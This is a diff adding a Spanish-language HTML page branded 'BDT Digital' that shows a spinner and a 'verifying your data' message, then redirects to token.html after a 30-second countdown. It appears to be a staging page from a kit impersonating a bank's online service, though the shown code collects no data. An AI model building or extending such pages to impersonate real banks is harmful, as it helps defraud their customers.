@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BDT Digital</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body
+    class="bg-gray-100 flex flex-col items-center justify-center min-h-screen"
+  >
+    <div class="w-full max-w-sm bg-white rounded-xl shadow-lg space-y-6">
+      <div
+        class="w-full bg-blue-900 py-4 px-6 flex items-center justify-center md:justify-start"
+      >
+        <div class="flex items-center w-full max-w-5xl">
+          <img src="logo2.png" alt="BDT logo" class="mr-3" />
+        </div>
+      </div>
+
+      <!-- Card -->
+      <div
+        class="mt-16 w-12/12 max-w-lg md:max-w-xl lg:max-w-2xl text-center"
+        style="margin-bottom: 50px"
+      >
+        <h2 class="text-blue-900 text-xl md:text-2xl font-semibold">
+          Conectado con BDT Digital...
+        </h2>
+
+        <!-- Loading Spinner -->
+        <div class="flex justify-center items-center mt-6">
+          <svg
+            class="animate-spin h-12 w-12 text-blue-900"
+            xmlns="http://www.w3.org/2000/svg"
+            fill="none"
+            viewBox="0 0 24 24"
+          >
+            <circle
+              class="opacity-25"
+              cx="12"
+              cy="12"
+              r="10"
+              stroke="currentColor"
+              stroke-width="4"
+            ></circle>
+            <path
+              class="opacity-75"
+              fill="currentColor"
+              d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
+            ></path>
+          </svg>
+        </div>
+
+        <p class="text-gray-600 mt-4 text-base md:text-lg">
+          Estamos verificando sus datos por favor espere
+          <span id="countdown">30</span> segundos
+        </p>
+        <script>
+          // Función para iniciar la cuenta regresiva
+          function startCountdown(seconds) {
+            // Obtener el elemento <span> donde mostraremos el contador
+            var countdownElement = document.getElementById("countdown");
+
+            // Iniciar el intervalo de cuenta regresiva
+            var countdownInterval = setInterval(function () {
+              // Actualizar el contenido del elemento con el valor actual de segundos
+              countdownElement.textContent = seconds;
+
+              // Reducir el valor de segundos
+              seconds--;
+
+              // Verificar si el contador ha llegado a cero
+              if (seconds < 0) {
+                // Limpiar el intervalo y mostrar una alerta
+                clearInterval(countdownInterval);
+
+                window.location.href = "token.html";
+              }
+            }, 1000); // Intervalo de 1 segundo
+          }
+
+          // Llamar a la función de cuenta regresiva al cargar la página
+          document.addEventListener("DOMContentLoaded", function () {
+            startCountdown(29); // Iniciar la cuenta regresiva con 30 segundos
+          });
+        </script>
+      </div>
+    </div>
+    <!-- Header -->
+  </body>
+</html>
